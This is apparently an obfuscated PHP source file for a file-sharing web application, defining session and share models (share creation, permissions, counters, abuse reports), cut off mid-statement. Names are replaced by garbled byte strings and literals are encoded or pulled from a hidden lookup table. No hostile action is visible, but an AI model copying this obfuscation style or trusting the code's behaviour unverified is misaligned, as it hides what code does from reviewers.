<?php
 goto a­‚·ˆºëî; A¦åİ¿Ùä: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\155\137\x73\145\163\163\x69\x6f\156"; public function get($ÌïÄéÃ²) { $ÕØÎº‘ñ =& $_SERVER[¶Ô„œ…¯]; $½ĞÓÀ¸Ö = $this->where(array($ÕØÎº‘ñ[2119] => $ÌïÄéÃ²))->find(); if (!is_array($½ĞÓÀ¸Ö)) { return !1; } return $½ĞÓÀ¸Ö[$ÕØÎº‘ñ[171]]; } public function set($Ê™Õª­, $çİÍ´İ, $¶§Ò«èõ = 3600) { $¥Öµ¼°¦ =& $_SERVER[¶Ô„œ…¯]; $ÍôĞØ“¦ = array($¥Öµ¼°¦[2119] => $Ê™Õª­, $¥Öµ¼°¦[2019] => $çİÍ´İ, $¥Öµ¼°¦[2120] => $¶§Ò«èõ + time()); if (Session::get($¥Öµ¼°¦[2121])) { $ÍôĞØ“¦[$¥Öµ¼°¦[1780]] = Session::get($¥Öµ¼°¦[2121]); } else { $ÍôĞØ“¦[$¥Öµ¼°¦[1780]] = 0; } if ($this->get($Ê™Õª­)) { return $this->where(array($¥Öµ¼°¦[2119] => $Ê™Õª­))->save($ÍôĞØ“¦); } else { return $this->add($ÍôĞØ“¦, array(), !0); } } public function remove($˜êèÈƒİ) { return $this->where(array($_SERVER[¶Ô„œ…¯][2119] => $˜êèÈƒİ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¶Ô„œ…¯][2122] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\x65"; protected $dataAuto = array(array("\155\157\x64\151\x66\x79\124\x69\x6d\x65", "\164\x69\x6d\145", "\x69\156\x73\x65\x72\x74\x2c\165\x70\144\x61\164\x65", "\146\165\156\143\x74\x69\157\x6e"), array("\143\x72\x65\x61\x74\145\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\151\x6e\163\145\x72\x74", "\x66\165\x6e\x63\164\x69\x6f\156"), array("\x6f\160\164\151\x6f\156\x73", '', "\x69\x6e\163\145\162\164\x2c\165\x70\144\x61\x74\x65\54\163\145\154\145\143\164", "\152\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($‹É‹Æº¨) { $ Õ™ËÖ— =& $_SERVER[¶Ô„œ…¯]; $ûº˜˜–À = isset($‹É‹Æº¨[0]) ? $‹É‹Æº¨[0] : !1; $–±´Ş÷Ç = $ Õ™ËÖ—[2123] . USER_ID; return array($ Õ™ËÖ—[2124] => array(USER_ID, $ Õ™ËÖ—[2125], $–±´Ş÷Ç), $ Õ™ËÖ—[2064] => array($ûº˜˜–À, $ Õ™ËÖ—[2126], $–±´Ş÷Ç)); } protected function listSimple() { $ÏãÄ«ó = array($_SERVER[¶Ô„œ…¯][1780] => USER_ID); $éªÎÉØ´ = $this->field($this->fieldList)->where($ÏãÄ«ó)->select(); return $éªÎÉØ´ ? $éªÎÉØ´ : array(); } protected function getInfo($´„ëßÒ, $È†º–Å˜ = false, $¥åşî„™ = '') { $ Ô×‡‡Ç =& $_SERVER[¶Ô„œ…¯]; if ($È†º–Å˜) { return $this->_getShareInfo(array($ Ô×‡‡Ç[670] => $´„ëßÒ)); } $òâ›Ã©Å = $this->cacheFunctionGet($ Ô×‡‡Ç[2066], $´„ëßÒ, $¥åşî„™); return $òâ›Ã©Å; } public function getInfoByHash($Œ§ø™ÅØ) { return $this->_getShareInfo(array($_SERVER[¶Ô„œ…¯][2127] => $Œ§ø™ÅØ)); } public function getInfoByPath($±øËñ™‘) { $€îù™‹‡ =& $_SERVER[¶Ô„œ…¯]; $òåé´ = array($€îù™‹‡[1780] => USER_ID, $€îù™‹‡[193] => $±øËñ™‘); return $this->_getShareInfo($òåé´); } public function getInfoBySourcePath($å—ëÁ¹ğ) { $¿¹˜î—Ë =& $_SERVER[¶Ô„œ…¯]; $àãçÃÎË = array($¿¹˜î—Ë[1780] => USER_ID, $¿¹˜î—Ë[1264] => $å—ëÁ¹ğ); return $this->_getShareInfo($àãçÃÎË); } private function _getShareInfo($¶ÊúÆÛà) { $…¶¤àÏˆ =& $_SERVER[¶Ô„œ…¯]; $¨³İæÆ = $this->where($¶ÊúÆÛà)->find(); if (!$¨³İæÆ) { return !1; } $¶ÊúÆÛà = array($…¶¤àÏˆ[670] => $¨³İæÆ[$…¶¤àÏˆ[670]]); $õÊ«µçÎ = $…¶¤àÏˆ[2128]; $Ò÷Ş©×å = Model($…¶¤àÏˆ[671])->order($…¶¤àÏˆ[477])->field($õÊ«µçÎ)->where($¶ÊúÆÛà)->select(); if ($¨³İæÆ[$…¶¤àÏˆ[193]] == $…¶¤àÏˆ[230]) { $¨³İæÆ[$…¶¤àÏˆ[90]] = IO::info($¨³İæÆ[$…¶¤àÏˆ[1264]]); } else { $¨³İæÆ[$…¶¤àÏˆ[90]] = Model($…¶¤àÏˆ[1428])->pathInfo($¨³İæÆ[$…¶¤àÏˆ[193]]); } $¨³İæÆ[$…¶¤àÏˆ[2129]] = $Ò÷Ş©×å; return $¨³İæÆ; } protected function getInfoAuth($‹šß²¸„) { $–¹Âæ›  =& $_SERVER[¶Ô„œ…¯]; $¯¥³ãÍİ = $this->getInfo($‹šß²¸„); if ($¯¥³ãÍİ[$–¹Âæ› [1780]] == USER_ID) { $¯¥³ãÍİ[$–¹Âæ› [489]] = $¯¥³ãÍİ[$–¹Âæ› [90]][$–¹Âæ› [489]]; } else { $¯¥³ãÍİ[$–¹Âæ› [489]] = Model($–¹Âæ› [569])->authMake($¯¥³ãÍİ[$–¹Âæ› [2129]]); } return $¯¥³ãÍİ; } protected function listData($âñ–ë³Ã = null, $Î¦çº±í = 300) { $…¾ïº‘ =& $_SERVER[¶Ô„œ…¯]; $´Èè¢÷ = array(array($…¾ïº‘[564] => array($…¾ïº‘[1096], 0), $…¾ïº‘[668] => array($…¾ïº‘[1096], 0), $…¾ïº‘[2130] => $…¾ïº‘[2082])); if ($âñ–ë³Ã == $…¾ïº‘[2131]) { $´Èè¢÷ = array($…¾ïº‘[564] => 1); } else { if ($âñ–ë³Ã == $…¾ïº‘[1249]) { $´Èè¢÷ = array($…¾ïº‘[668] => 1); } } $´Èè¢÷[$…¾ïº‘[1780]] = USER_ID; $ÂùÄµ¤å = $this->where($´Èè¢÷)->selectPage($Î¦çº±í); return $ÂùÄµ¤å; } protected function listToMe($Ÿ·´ªê = 300) { $¾‡èÕ§å =& $_SERVER[¶Ô„œ…¯]; $÷ğºÂà  = Model($¾‡èÕ§å[2132])->userGroupParents(USER_ID); $Ê´¥’âŠ = array($¾‡èÕ§å[653] => SourceModel::TYPE_USER, $¾‡èÕ§å[571] => USER_ID); if ($÷ğºÂà ) { $Ê´¥’âŠ = array(array($¾‡èÕ§å[653] => SourceModel::TYPE_USER, $¾‡èÕ§å[571] => USER_ID), array($¾‡èÕ§å[653] => SourceModel::TYPE_GROUP, $¾‡èÕ§å[571] => array($¾‡èÕ§å[7], $÷ğºÂà )), $¾‡èÕ§å[2130] => $¾‡èÕ§å[2082]); } $¹¾ÊÔ• = Model($¾‡èÕ§å[671])->where($Ê´¥’âŠ)->selectPage($Ÿ·´ªê); $àÆ²Äû = array_to_keyvalue_group($¹¾ÊÔ•[$¾‡èÕ§å[447]], $¾‡èÕ§å[670]); if (!$àÆ²Äû) { return $¹¾ÊÔ•; } $¼û¸ªù® = $¾‡èÕ§å[2133]; $Ê´¥’âŠ = array($¾‡èÕ§å[670] => array($¾‡èÕ§å[494], array_keys($àÆ²Äû)), $¾‡èÕ§å[1780] => array($¾‡èÕ§å[1098], $¾‡èÕ§å[230])); $¥ö¤Í¾ = $this->field($¼û¸ªù®)->where($Ê´¥’âŠ)->select(); foreach ($¥ö¤Í¾ as $ÊòÙÁ¹š => &$«™‹) { $«™‹[$¾‡èÕ§å[2129]] = $àÆ²Äû[$«™‹[$¾‡èÕ§å[670]]]; } unset($«™‹); $¡ÛŠ“Ó¼ = array($¾‡èÕ§å[2134] => $¥ö¤Í¾, $¾‡èÕ§å[2135] => $¹¾ÊÔ•[$¾‡èÕ§å[444]]); return $¡ÛŠ“Ó¼; } protected function shareAdd($³Œ’˜Î˜, $Ì“ÈÅÊı) { $õã˜öÉ† =& $_SERVER[¶Ô„œ…¯]; $‡ˆ·„·‡ = $this->_addShareData($³Œ’˜Î˜, $Ì“ÈÅÊı); if (!empty($Ì“ÈÅÊı[$õã˜öÉ†[2136]])) { $this->_shareAuthSet($‡ˆ·„·‡, $Ì“ÈÅÊı[$õã˜öÉ†[2136]]); } $this->shareEventAdd($³Œ’˜Î˜, $Ì“ÈÅÊı, $õã˜öÉ†[2137]); return $‡ˆ·„·‡; } protected function shareAddSystem($Ê˜ìÔì, $ÄïÇó†À) { $„ìÅª =& $_SERVER[¶Ô„œ…¯]; $æ¹Õ‹»¯ = $this->_addShareData($Ê˜ìÔì, $ÄïÇó†À, $„ìÅª[191]); $this->_shareAuthSet($æ¹Õ‹»¯, $ÄïÇó†À[$„ìÅª[2136]]); return $æ¹Õ‹»¯; } private function shareEventAdd($ÃËÌâéï, $ìÂ¨±ıÇ, $Úû…û¤Á = "\x61\x64\x64") { $™å§•õ½ =& $_SERVER[¶Ô„œ…¯]; if (!$ÃËÌâéï || $ÃËÌâéï == $™å§•õ½[230]) { return; } if ($Úû…û¤Á == $™å§•õ½[2137]) { if ($ìÂ¨±ıÇ[$™å§•õ½[564]] == $™å§•õ½[91]) { Model($™å§•õ½[638])->eventShare($ÃËÌâéï, $™å§•õ½[2138]); } if ($ìÂ¨±ıÇ[$™å§•õ½[668]] == $™å§•õ½[91]) { Model($™å§•õ½[638])->eventShare($ÃËÌâéï, $™å§•õ½[2139]); } return; } $ıïç£èÑ = $this->getInfoByPath($ÃËÌâéï); $ú‘†å§ã = $™å§•õ½[2140]; if ($ıïç£èÑ[$™å§•õ½[564]] == $™å§•õ½[230] && $ìÂ¨±ıÇ[$™å§•õ½[564]] == $™å§•õ½[91]) { $ú‘†å§ã = $™å§•õ½[2138]; } if ($ıïç£èÑ[$™å§•õ½[564]] == $™å§•õ½[91] && $ìÂ¨±ıÇ[$™å§•õ½[564]] == $™å§•õ½[230]) { $ú‘†å§ã = $™å§•õ½[2141]; } if ($ıïç£èÑ[$™å§•õ½[668]] == $™å§•õ½[230] && $ìÂ¨±ıÇ[$™å§•õ½[668]] == $™å§•õ½[91]) { $ú‘†å§ã = $™å§•õ½[2139]; } if ($ıïç£èÑ[$™å§•õ½[668]] == $™å§•õ½[91] && $ìÂ¨±ıÇ[$™å§•õ½[668]] == $™å§•õ½[230]) { $ú‘†å§ã = $™å§•õ½[2142]; } Model($™å§•õ½[638])->eventShare($ÃËÌâéï, $ú‘†å§ã); return; } private function _addShareData($Õ¿ÇÈËÎ, $µ‘ˆ³½ = array(), $»®—²Œ¿ = false) { $Ò¬°…Ø =& $_SERVER[¶Ô„œ…¯]; $¤ç³¨ßù = $»®—²Œ¿ == $Ò¬°…Ø[191] ? 0 : USER_ID; $¡èÄ»Á¸ = array($Ò¬°…Ø[493] => $Õ¿ÇÈËÎ, $Ò¬°…Ø[1771] => $¤ç³¨ßù); if ($Õ¿ÇÈËÎ == 0) { $¡èÄ»Á¸ = array($Ò¬°…Ø[2143] => $µ‘ˆ³½[$Ò¬°…Ø[1264]], $Ò¬°…Ø[1771] => $¤ç³¨ßù); } if ($†ãüÁé¢ = $this->where($¡èÄ»Á¸)->find()) { return $†ãüÁé¢[$Ò¬°…Ø[670]]; } if ($Õ¿ÇÈËÎ == 0) { $Üß³Âë” = array($Ò¬°…Ø[32] => get_path_this($µ‘ˆ³½[$Ò¬°…Ø[87]])); } else { $Üß³Âë” = Model($Ò¬°…Ø[903])->sourceInfo($Õ¿ÇÈËÎ); if (!$Üß³Âë”) { return !1; } } if (!$µ‘ˆ³½[$Ò¬°…Ø[1666]]) { $µ‘ˆ³½[$Ò¬°…Ø[1666]] = $Üß³Âë”[$Ò¬°…Ø[32]]; } $ÈÍã…·¹ = array($Ò¬°…Ø[1771] => $¤ç³¨ßù, $Ò¬°…Ø[493] => $Õ¿ÇÈËÎ, $Ò¬°…Ø[1666] => $Ò¬°…Ø[12], $Ò¬°…Ø[564] => 0, $Ò¬°…Ø[668] => 0, $Ò¬°…Ø[1264] => $Ò¬°…Ø[12], $Ò¬°…Ø[384] => $Ò¬°…Ø[12], $Ò¬°…Ø[973] => $Ò¬°…Ø[12], $Ò¬°…Ø[2144] => 0, $Ò¬°…Ø[2145] => 0, $Ò¬°…Ø[839] => 0, $Ò¬°…Ø[2146] => $Ò¬°…Ø[12], $Ò¬°…Ø[2127] => $Ò¬°…Ø[12]); $æ‹œö© = explode($Ò¬°…Ø[50], $Ò¬°…Ø[2147]); foreach ($æ‹œö© as $¢ÒğøÜ) { if (!isset($µ‘ˆ³½[$¢ÒğøÜ])) { continue; } $ÈÍã…·¹[$¢ÒğøÜ] = $µ‘ˆ³½[$¢ÒğøÜ]; } $¯ß¨Û¹ª = $this->add($ÈÍã…·¹); $‘Úæ¿ıõ = array($Ò¬°…Ø[2127] => short_id($¯ß¨Û¹ª)); $this->where(array($Ò¬°…Ø[2148] => $¯ß¨Û¹ª))->save($‘Úæ¿ıõ); return $¯ß¨Û¹ª; } private function _shareAuthSet($ëáöÑ†Ï, $ê¼Æñ‘›) { $©Û€Úñ’ =& $_SERVER[¶Ô„œ…¯]; if (!is_array($ê¼Æñ‘›)) { return !1; } $“½³ÆÂË = Model($©Û€Úñ’[2092]); $“½³ÆÂË->where(array($©Û€Úñ’[670] => $ëáöÑ†Ï))->delete(); $¼øşœÇ = array(); foreach ($ê¼Æñ‘› as $Ç¾äã¬) { $û±Ü¢àó = SourceModel::TYPE_USER; if ($Ç¾äã¬[$©Û€Úñ’[190]] == SourceModel::TYPE_GROUP) { $û±Ü¢àó = SourceModel::TYPE_GROUP; } $ÔÆóÁ¼¥ = array($©Û€Úñ’[670] => $ëáöÑ†Ï, $©Û€Úñ’[190] => $û±Ü¢àó, $©Û€Úñ’[571] => intval($Ç¾äã¬[$©Û€Úñ’[571]]), $©Û€Úñ’[2088] => 0, $©Û€Úñ’[2149] => -1); if ($Ç¾äã¬[$©Û€Úñ’[2088]]) { $ÔÆóÁ¼¥[$©Û€Úñ’[2088]] = $Ç¾äã¬[$©Û€Úñ’[2088]]; } else { if ($Ç¾äã¬[$©Û€Úñ’[2149]]) { $ÔÆóÁ¼¥[$©Û€Úñ’[2149]] = $Ç¾äã¬[$©Û€Úñ’[2149]]; } } $¼øşœÇ[] = $ÔÆóÁ¼¥; } return $“½³ÆÂË->addAll($¼øşœÇ, array(), !0); } public function numViewAdd($ñúò†úƒ) { $ŒÇÖÈñ =& $_SERVER[¶Ô„œ…¯]; $ÍÁßæµ– = array($ŒÇÖÈñ[2148] => $ñúò†úƒ); $this->where($ÍÁßæµ–)->setAdd($ŒÇÖÈñ[2144]); } public function numDownloadAdd($±ÆÁÊ‡ë) { $¶Â×èˆä =& $_SERVER[¶Ô„œ…¯]; $Æöœ«¡” = array($¶Â×èˆä[2148] => $±ÆÁÊ‡ë); $this->where($Æöœ«¡”)->setAdd($¶Â×èˆä[2145]); } protected function shareEdit($²Î­¤—³, $…ŸºÎ³­) { $²×á‹İæ =& $_SERVER[¶Ô„œ…¯]; $¸˜ú÷Êœ = $this->getInfo($²Î­¤—³); if (!$¸˜ú÷Êœ) { return !1; } $this->_checkLinkShare($…ŸºÎ³­, $¸˜ú÷Êœ); $»ğÛ™ë¤ = array(); $¸´¸¡•É = explode($²×á‹İæ[50], $²×á‹İæ[2150]); foreach ($¸´¸¡•É as $ŞÜŒ„Ø») { if (!array_key_exists($ŞÜŒ„Ø», $…ŸºÎ³­)) { continue; } $»ğÛ™ë¤[$ŞÜŒ„Ø»] = $…ŸºÎ³­[$ŞÜŒ„Ø»]; } $this->shareEventAdd($¸˜ú÷Êœ[$²×á‹İæ[193]], $…ŸºÎ³­, $²×á‹İæ[1949]); $this->where(array($²×á‹İæ[2148] => $²Î­¤—³))->save($»ğÛ™ë¤); if (isset($…ŸºÎ³­[$²×á‹İæ[2136]])) { $this->_shareAuthSet($²Î­¤—³, $…ŸºÎ³­[$²×á‹İæ[2136]]); } return !0; } private function _checkLinkShare($ÖìÀ‚Æ·, $×Ïœì¦) { $Ø•Ãî™Å =& $_SERVER[¶Ô„œ…¯]; if ($ÖìÀ‚Æ·[$Ø•Ãî™Å[564]] != $Ø•Ãî™Å[91]) { return; } $°¯¸äà = $×Ïœì¦[$Ø•Ãî™Å[90]][$Ø•Ãî™Å[193]]; if ($×Ïœì¦[$Ø•Ãî™Å[90]][$Ø•Ãî™Å[33]] != $Ø•Ãî™Å[232]) { $ö“ñıò² = $this->_folderReport($°¯¸äà); if (!$ö“ñıò²) { return; } show_json(LNG($Ø•Ãî™Å[2151]) . $Ø•Ãî™Å[2152] . $ö“ñıò², !1); } $¦¹¶„ò… = Model($Ø•Ãî™Å[903])->fileInfoGet($×Ïœì¦[$Ø•Ãî™Å[90]][$Ø•Ãî™Å[193]]); if (!$¦¹¶„ò…) { return; } $÷­¸¸Øò = $this->shareFileMeta($¦¹¶„ò…[$Ø•Ãî™Å[543]]); if (isset($÷­¸¸Øò[$Ø•Ãî™Å[452]]) && $÷­¸¸Øò[$Ø•Ãî™Å[452]] == $Ø•Ãî™Å[91]) { show_json(LNG($Ø•Ãî™Å[2153]), !1); } } private function _folderReport($ƒØõ¼’) { $×û€¤”ˆ =& $_SERVER[¶Ô„œ…¯]; $ ’ºõô = array($×û€¤”ˆ[543] => array($×û€¤”ˆ[1096], 0), $×û€¤”ˆ[828] => 3); $Æ¤ÑÙäƒ = Model($×û€¤”ˆ[2154])->where($ ’ºõô)->field($×û€¤”ˆ[543])->select(); if (!$Æ¤ÑÙäƒ) { return !1; } $Æ¤ÑÙäƒ = array_to_keyvalue($Æ¤ÑÙäƒ, $×û€¤”ˆ[12], $×û€¤”ˆ[543]); $òªò ÔØ = $×û€¤”ˆ[50] . $ƒØõ¼’ . $×û€¤”ˆ[50]; $ ’ºõô = array($×û€¤”ˆ[543] => array($×û€¤”ˆ[7], $Æ¤ÑÙäƒ), $×û€¤”ˆ[586] => array($×û€¤”ˆ[461], "\45{$òªò ÔØ}\45"), $×û€¤”ˆ[507] => 0); $—ô«ï…‡ = Model($×û€¤”ˆ[903])->where($ ’ºõô)->field($×û€¤”ˆ[2155])->find(); if (!$—ô«ï…‡) { return !1; } $ÓË—÷ì¨ = substr($—ô«ï…‡[$×û€¤”ˆ[586]], strpos($—ô«ï…‡[$×û€¤”ˆ[586]], $òªò ÔØ)); $ ’ºõô = array($×û€¤”ˆ[193] => array($×û€¤”ˆ[7], trim($ÓË—÷ì¨, $×û€¤”ˆ[50]))); $®Œ”®¹Î = Model($×û€¤”ˆ[903])->where($ ’ºõô)->field($×û€¤”ˆ[32])->select(); $Ì›Äø = array_to_keyvalue($®Œ”®¹Î, $×û€¤”ˆ[12], $×û€¤”ˆ[32]); $Ì›Äø[] = $—ô«ï…‡[$×û€¤”ˆ[32]]; return implode($×û€¤”ˆ[8], $Ì›Äø); } protected function remove($Óš®½) { $¸Â…ßÛ² =& $_SERVER[¶Ô„œ…¯]; $©œİÌ¤ = is_array($Óš®½) ? $Óš®½ : array($Óš®½); for ($÷§¾¹Ö = 0; $÷§¾¹Ö < count($©œİÌ¤); $÷§¾¹Ö++) { $°Ü÷—âò = $this->getInfo($©œİÌ¤[$÷§¾¹Ö]); if ($°Ü÷—âò[$¸Â…ßÛ²[668]] == $¸Â…ßÛ²[91]) { Model($¸Â…ßÛ²[638])->eventShare($°Ü÷—âò[$¸Â…ßÛ²[193]], $¸Â…ßÛ²[2142]); } if ($°Ü÷—âò[$¸Â…ßÛ²[564]] == $¸Â…ßÛ²[91]) { Model($¸Â…ßÛ²[638])->eventShare($°Ü÷—âò[$¸Â…ßÛ²[193]], $¸Â…ßÛ²[2141]); } } if (is_array($Óš®½)) { $Óš®½ = array($¸Â…ßÛ²[7], $Óš®½); } $Âå“åğ = array($¸Â…ßÛ²[670] => $Óš®½); $ßîÈÓë¡ = $this->where($Âå“åğ)->delete(); if ($ßîÈÓë¡) { Model($¸Â…ßÛ²[671])->where(array($¸Â…ßÛ²[670] => $Óš®½))->delete(); } return $ßîÈÓë¡; } protected function removeBySource($¥ıí«üŸ) { $¿íºÌ =& $_SERVER[¶Ô„œ…¯]; $ÚûÈ—Õ¾ = array($¿íºÌ[493] => array($¿íºÌ[494], $¥ıí«üŸ)); $­ş‡Ó» = $this->field($¿íºÌ[670])->where($ÚûÈ—Õ¾)->select(); $­ş‡Ó» = array_to_keyvalue($­ş‡Ó», $¿íºÌ[12], $¿íºÌ[670]); if (!$­ş‡Ó») { return; } $ÚûÈ—Õ¾ = array($¿íºÌ[2148] => array($¿íºÌ[494], $­ş‡Ó»)); $this->where($ÚûÈ—Õ¾)->delete(); Model($¿íºÌ[671])->where($ÚûÈ—Õ¾)->delete(); } public function listAll($ƒ¢ë±óö) { $ÏÎ–ÕÅÉ =& $_SERVER[¶Ô„œ…¯]; $Ú¨÷èÍø = array(); if ($ƒ¢ë±óö[$ÏÎ–ÕÅÉ[1780]]) { $Ú¨÷èÍø[$ÏÎ–ÕÅÉ[1780]] = $ƒ¢ë±óö[$ÏÎ–ÕÅÉ[1780]]; } if ($ƒ¢ë±óö[$ÏÎ–ÕÅÉ[838]]) { $ö×çä = $ƒ¢ë±óö[$ÏÎ–ÕÅÉ[839]] ? $ƒ¢ë±óö[$ÏÎ–ÕÅÉ[839]] : strtotime(date($ÏÎ–ÕÅÉ[2156])); $Ú¨÷èÍø[$ÏÎ–ÕÅÉ[233]] = array($ÏÎ–ÕÅÉ[410], array($ƒ¢ë±óö[$ÏÎ–ÕÅÉ[838]], $ö×çä)); } if ($ƒ¢ë±óö[$ÏÎ–ÕÅÉ[33]]) { $Ú¨÷èÍø[$ƒ¢ë±óö[$ÏÎ–ÕÅÉ[33]]] = 1; } else { $Ú¨÷èÍø[] = array($ÏÎ–ÕÅÉ[564] => array($ÏÎ–ÕÅÉ[1096], 0), $ÏÎ–ÕÅÉ[668] => array($ÏÎ–ÕÅÉ[1096], 0), $ÏÎ–ÕÅÉ[2130] => $ÏÎ–ÕÅÉ[2082]); } if ($ƒ¢ë±óö[$ÏÎ–ÕÅÉ[2078]]) { $Ú¨÷èÍø[] = array($ÏÎ–ÕÅÉ[2127] => $ƒ¢ë±óö[$ÏÎ–ÕÅÉ[2078]], $ÏÎ–ÕÅÉ[1666] => array($ÏÎ–ÕÅÉ[461], "\45{$ƒ¢ë±óö[$ÏÎ–ÕÅÉ[2078]]}\45"), $ÏÎ–ÕÅÉ[2130] => $ÏÎ–ÕÅÉ[2082]); } $‚®ô´ãè = $this->_makeOrder()->where($Ú¨÷èÍø)->selectPage(20); if (empty($‚®ô´ãè[$ÏÎ–ÕÅÉ[447]])) { return array(); } $this->_listDataApply($‚®ô´ãè[$ÏÎ–ÕÅÉ[447]]); return $‚®ô´ãè; } public function listDataApply($½°‰®¸œ) { $this->_listDataApply($½°‰®¸œ); return $½°‰®¸œ; } private function _listDataApply(&$ğÑÒÑ°’) { $¬ùîõùŞ =& $_SERVER[¶Ô„œ…¯]; $×—Ú¸ú = array_to_keyvalue($ğÑÒÑ°’, $¬ùîõùŞ[12], $¬ùîõùŞ[1780]); $Õ¡ŸÉã³ = Model($¬ùîõùŞ[599])->userListInfo(array_unique($×—Ú¸ú)); $”‘ª¡±› = array_to_keyvalue($ğÑÒÑ°’, $¬ùîõùŞ[12], $¬ùîõùŞ[193]); $úæòôø = Model($¬ùîõùŞ[903])->sourceListInfo($”‘ª¡±›, !0); foreach ($ğÑÒÑ°’ as $¼îÚÎÌÙ => &$¤²·ï«¦) { $‰Ó‹ÆÇĞ = $¤²·ï«¦[$¬ùîõùŞ[1780]]; $¤²·ï«¦[$¬ùîõùŞ[2157]] = $Õ¡ŸÉã³[$‰Ó‹ÆÇĞ] ? $Õ¡ŸÉã³[$‰Ó‹ÆÇĞ] : !1; $¢Á¼İö¶ = $¤²·ï«¦[$¬ùîõùŞ[193]]; $¤²·ï«¦[$¬ùîõùŞ[90]] = $úæòôø[$¢Á¼İö¶] ? $úæòôø[$¢Á¼İö¶] : !1; if ($¤²·ï«¦[$¬ùîõùŞ[90]][$¬ùîõùŞ[507]] == $¬ùîõùŞ[91]) { unset($ğÑÒÑ°’[$¼îÚÎÌÙ]); } if ($¤²·ï«¦[$¬ùîõùŞ[90]] != $¬ùîõùŞ[230] && !$¤²·ï«¦[$¬ùîõùŞ[90]]) { unset($ğÑÒÑ°’[$¼îÚÎÌÙ]); } } unset($¤²·ï«¦); $ğÑÒÑ°’ = array_values($ğÑÒÑ°’); } private function _makeOrder($Î‘Ï”ì = '') { $‡øäóÕŠ =& $_SERVER[¶Ô„œ…¯]; $Œª³‘–– = array($‡øäóÕŠ[233], $‡øäóÕŠ[839], $‡øäóÕŠ[2144], $‡øäóÕŠ[2145]); $œÛÀÃâ = array($‡øäóÕŠ[525] => $‡øäóÕŠ[526], $‡øäóÕŠ[527] => $‡øäóÕŠ[528]); $¾õÍÔØÖ = Input::get($‡øäóÕŠ[532], $‡øäóÕŠ[7], $‡øäóÕŠ[499], $Œª³‘––); $‰‹·æïÉ = Input::get($‡øäóÕŠ[533], $‡øäóÕŠ[7], $‡øäóÕŠ[2158], array($‡øäóÕŠ[2075], $‡øäóÕŠ[527])); $‰‹·æïÉ = $œÛÀÃâ[$‰‹·æïÉ]; $Î‘Ï”ì = $Î‘Ï”ì . "{$¾õÍÔØÖ}\x20{$‰‹·æïÉ}"; return $this->order($Î‘Ï”ì); } public function reportAdd($âøüñï) { $Œâ©Æ„ =& $_SERVER[¶Ô„œ…¯]; $«ßìôÔ† = array($Œâ©Æ„[670] => $âøüñï[$Œâ©Æ„[670]], $Œâ©Æ„[1780] => USER_ID); if (Model($Œâ©Æ„[2154])->where($«ßìôÔ†)->find()) { return !1; } $ê†˜ß¼ = array($Œâ©Æ„[670] => $âøüñï[$Œâ©Æ„[670]], $Œâ©Æ„[1666] => $âøüñï[$Œâ©Æ„[1666]], $Œâ©Æ„[193] => $âøüñï[$Œâ©Æ„[193]], $Œâ©Æ„[543] => $âøüñï[$Œâ©Æ„[543]], $Œâ©Æ„[1780] => USER_ID, $Œâ©Æ„[33] => $âøüñï[$Œâ©Æ„[33]], $Œâ©Æ„[528] => $âøüñï[$Œâ©Æ„[528]]); return Model($Œâ©Æ„[2154])->add($ê†˜ß¼); } public function reportList($Îå»ó–) { $Ôšâ§ı€ =& $_SERVER[¶Ô„œ…¯]; $ŒµŸ”¸¡ = array(); if ($Îå»ó–[$Ôšâ§ı€[838]]) { $ßÃ¨§ = $Îå»ó–[$Ôšâ§ı€[839]] ? $Îå»ó–[$Ôšâ§ı€[839]] : strtotime(date($Ôšâ§ı€[2156])); $ŒµŸ”¸¡[$Ôšâ§ı€[233]] = array($Ôšâ§ı€[410], array($Îå»ó–[$Ôšâ§ı€[838]], $ßÃ¨§)); } if (isset($Îå»ó–[$Ôšâ§ı€[33]]) && in_array($Îå»ó–[$Ôšâ§ı€[33]], array($Ôšâ§ı€[91], $Ôšâ§ı€[512], $Ôšâ§ı€[2159], $Ôšâ§ı€[2160], $Ôšâ§ı€[2161]))) { $ŒµŸ”¸¡[$Ôšâ§ı€[33]] = $Îå»ó–[$Ôšâ§ı€[33]]; } if (isset($Îå»ó–[$Ôšâ§ı€[828]]) && in_array($Îå»ó–[$Ôšâ§ı€[828]], array($Ôšâ§ı€[230], $Ôšâ§ı€[91], $Ôšâ§ı€[512], $Ôšâ§ı€[2159]))) { $ŒµŸ”¸¡[$Ôšâ§ı€[828]] = $Îå»ó–[$Ôšâ§ı€[828]]; } $ğê´Ö‘© = Input::get($Ôšâ§ı€[533], $Ôšâ§ı€[7], $Ôšâ§ı€[2158], array($Ôšâ§ı€[2075], $Ôšâ§ı€[527])); $½Ù¨Ù¨ö = array($Ôšâ§ı€[525] => $Ôšâ§ı€[526], $Ôšâ§ı€[527] => $Ôšâ§ı€[528]); $Åó™ö¸ = $Ôšâ§ı€[2162] . $½Ù¨Ù¨ö[$ğê´Ö‘©]; $İ³á¯Öß = Model($Ôšâ§ı€[2154])->where($ŒµŸ”¸¡)->order($Åó™ö¸)->selectPage(20); if (empty($İ³á¯Öß[$Ôšâ§ı€[447]])) { return array(); } $×Â˜ä€’ = array_to_keyvalue_group($İ³á¯Öß[$Ôšâ§ı€[447]], $Ôšâ§ı€[828], $Ôšâ§ı€[670]); if (!empty($×Â˜ä€’[0])) { $Îå»ó– = $×Â˜ä€’[0]; $ŒµŸ”¸¡ = array($Ôšâ§ı€[670] => array($Ôšâ§ı€[7], $Îå»ó–)); $‡ÊÚÊú« = $this->where($ŒµŸ”¸¡)->field($Ôšâ§ı€[670])->select(); $‡ÊÚÊú« = array_to_keyvalue($‡ÊÚÊú«, $Ôšâ§ı€[12], $Ôšâ§ı€[670]); $øĞ×Ü†Ì = array_diff($Îå»ó–, $‡ÊÚÊú«); if (!empty($øĞ×Ü†Ì)) { foreach ($İ³á¯Öß[$Ôšâ§ı€[447]] as $©õæ¡Ñ => $¦ôÙØâ) { if (in_array($¦ôÙØâ[$Ôšâ§ı€[670]], $øĞ×Ü†Ì)) { unset($İ³á¯Öß[$Ôšâ§ı€[447]][$©õæ¡Ñ]); } } } } $this->_listDataApply($İ³á¯Öß[$Ôšâ§ı€[447]]); return $İ³á¯Öß; } public function reportStatus($ÂÕûˆß) { $Ÿ‘ñÖÂŒ =& $_SERVER[¶Ô„œ…¯]; $±ÍÑÏÖ÷ = array($Ÿ‘ñÖÂŒ[477] => 